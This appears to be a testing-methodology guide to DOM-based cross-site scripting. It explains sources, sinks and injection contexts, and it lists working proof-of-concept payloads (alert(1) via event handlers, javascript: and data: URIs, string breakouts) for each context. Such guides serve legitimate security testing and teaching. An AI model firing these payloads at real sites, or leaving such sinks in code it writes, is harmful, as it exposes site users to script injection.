# DOM XSS — Fundamentals (Sources, Sinks, Contexts)

## When this applies

You're starting DOM-based XSS testing on any client-side JavaScript application. Before crafting payloads, you need to understand the source-sink mental model and the four common context families (HTML, attribute, JavaScript string, URL/href).

## Technique

DOM-based vulnerabilities arise when JavaScript takes attacker-controllable data from a **source** and passes it to a dangerous **sink** without proper validation or sanitization.

**Key Characteristics:**
- Client-side execution (JavaScript processes the payload)
- May not appear in HTTP responses
- Difficult to detect with traditional scanners
- Can bypass server-side protections

### Sources and Sinks

**Common Sources (where attacker data originates):**
- `location.search` - URL query parameters
- `location.hash` - URL fragment identifier
- `location.href` - Full URL
- `document.referrer` - Referrer header
- `document.cookie` - Cookie values
- `postMessage` - Web messages
- `window.name` - Window name property
- Web Storage (localStorage, sessionStorage)

**Common Sinks (dangerous functions):**
- `document.write()` - Writes HTML to page
- `innerHTML` - Sets HTML content
- `outerHTML` - Replaces element with HTML
- `eval()` - Executes JavaScript code
- `setTimeout()` / `setInterval()` - Execute code strings
- `Function()` - Creates functions from strings
- `location` - Navigates to URLs
- `element.src` - Sets source URLs
- `element.href` - Sets link targets
- jQuery methods: `$()`, `.html()`, `.attr()`

### DOM-Based Vulnerability Types

1. **DOM XSS** - Cross-site scripting via DOM manipulation
2. **DOM-based Open Redirect** - Redirect to attacker-controlled URLs
3. **DOM-based Cookie Manipulation** - Inject malicious cookie values
4. **Web Message Vulnerabilities** - Exploit postMessage handlers
5. **Prototype Pollution** - Pollute Object.prototype
6. **DOM Clobbering** - Override DOM properties with HTML

### Classic DOM XSS Pattern

```javascript
// Vulnerable code
var search = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = search;

// Attack URL
/?q=<img src=x onerror=alert(1)>
```

## Steps

### Context-Based Exploitation

#### 1. HTML Context
When your input is reflected in HTML:

```html
<div id="output">USER_INPUT</div>
```

**Payloads:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<input onfocus=alert(1) autofocus>
```

#### 2. Attribute Context
When your input is inside an HTML attribute:

```html
<input value="USER_INPUT">
```

**Payloads:**
```html
" onclick="alert(1)
" onfocus="alert(1)" autofocus="
' onmouseover='alert(1)
```

#### 3. JavaScript String Context
When your input is inside a JavaScript string:

```javascript
var name = "USER_INPUT";
```

**Payloads:**
```javascript
"; alert(1); //
'-alert(1)-'
\"; alert(1); //
```

#### 4. URL/href Context
When your input sets a URL:

```html
<a href="USER_INPUT">Click</a>
```

**Payloads:**
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## Verifying success

- Payload triggers `alert(1)` (or chosen sink) in the victim's browser.
- DOM Invader / DevTools "Sources" panel shows the source-to-sink data flow.
- The exploit URL alone (no server-side changes) reproduces the issue — confirms client-only DOM vulnerability.

## Common pitfalls

1. **Confusing reflected XSS with DOM XSS** — DOM XSS may not appear in the HTTP response body; it's processed entirely client-side.
2. **Source not actually attacker-controllable in this context** — `document.cookie` requires existing access; `document.referrer` requires controlling the linking page.
3. **Wrong context payload** — using HTML payload in JS string context produces syntax error, not execution.
4. **Browser auto-encoding** — modern browsers encode some characters in URL → `location.search`. Test what actually reaches the sink.
5. **Sink not reached without specific app state** — the vulnerable code path may require login, a feature flag, or specific UI interaction.

## Tools

- **DOM Invader (Burp built-in)** — automatic source/sink detection with stack traces
- **DevTools Sources tab + breakpoints on sinks** — manual flow tracing
- **Browser console** — quick payload tests (`location.search = '?q=<img...>'`)
- **`grep -rE` on bundled JS** — find candidate sinks (`innerHTML`, `eval`, `document.write`)

## Related Scenarios

- `document-write-sink.md` — sink-specific exploitation for `document.write()` (including breakouts from `<select>` etc.)
- `innerhtml-sink.md` — `innerHTML` differs (script tags don't execute, must use event handlers)
- `jquery-sinks.md` — `$()`, `.html()`, `.attr()`, hashchange selector patterns
- `angularjs-injection.md` — AngularJS expression bypass when angle brackets are encoded
- `postmessage-vulnerabilities.md` — web message and `postMessage` exploitation
- `prototype-pollution-dom.md` — DOM XSS via client-side prototype pollution
- `dom-clobbering.md` — overriding DOM properties to bypass sanitizers
- `waf-filter-bypass.md` — encoding tricks and keyword splits for WAF evasion
- `detection-and-prevention.md` — defensive guidance and detection methodology
